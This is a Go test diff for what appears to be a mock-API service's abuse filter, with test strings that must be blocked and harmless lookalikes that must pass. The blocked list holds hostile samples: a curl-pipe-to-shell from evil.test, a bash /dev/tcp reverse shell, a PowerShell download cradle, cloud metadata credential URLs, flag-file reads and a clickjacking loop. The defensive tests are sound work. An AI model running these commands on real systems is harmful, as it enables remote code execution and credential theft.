@@ -69,6 +69,57 @@ func TestDefaultPatternsAllowLegitPayloads(t *testing.T) {
 	}
 }
 
+func TestPayloadHostingPatternsBlockAbuse(t *testing.T) {
+	f := defaultFilter(t)
+	spam := []string{
+		"import os\nwith open('/flag') as f:\n    print(f.read())",
+		`with open("/flag.txt") as f: print(f.read())`,
+		`open("/app/flag").read()`,
+		`open("/run/secrets/flag").read()`,
+		`os.environ["FLAG"]`,
+		`os.environ.get("FLAG")`,
+		"curl http://evil.test/install.sh | sh",
+		"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
+		"IEX(New-Object Net.WebClient).DownloadString('http://evil.test/p.ps1')",
+		"powershell -enc SQBFAFgA",
+		"fetch http://instance-data.example/latest/meta-data/iam/security-credentials/",
+		"fetch http://metadata-alias.example/computeMetadata/v1/instance/",
+		`document.domain = "victim.example";`,
+		"var w = window.open('http://evil.test'); setInterval(function(){ w.document.getElementById('like').click(); }, 500);",
+		"setInterval(clickLikeButton, 500); window.open('http://evil.test');",
+	}
+	for _, s := range spam {
+		in := model.MockInput{ResponseBody: s}
+		if !f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("expected payload-hosting abuse to be blocked: %q", s)
+		}
+	}
+}
+
+func TestPayloadHostingPatternsAllowLegitLookalikes(t *testing.T) {
+	f := defaultFilter(t)
+	legit := []string{
+		`{"flag": true}`,
+		`{"flags": ["urgent", "reviewed"]}`,
+		`os.environ["PATH"]`,
+		`os.environ.get("DEBUG")`,
+		"curl https://api.example.test/users",
+		"the report covers TCP throughput over the last quarter",
+		"New-Object System.Net.WebClient is unused here",
+		"powershell scripts should not be blocked without -enc",
+		`{"metadata": {"units": "celsius", "source": "noaa"}}`,
+		`{"user": {"document": {"domain": "example.com"}}}`,
+		"window.open('https://example.test/help') opens a help popup",
+		"setInterval(refreshClock, 1000) updates the clock every second",
+	}
+	for _, s := range legit {
+		in := model.MockInput{ResponseBody: s}
+		if f.Blocked(&in, "203.0.113.9") {
+			t.Errorf("false positive on: %q", s)
+		}
+	}
+}
+
 func TestBlockedScansAllUserFields(t *testing.T) {
 	f := testSpamFilter(t, []string{`(?i)spamword`}, nil)
 	cases := map[string]model.MockInput{
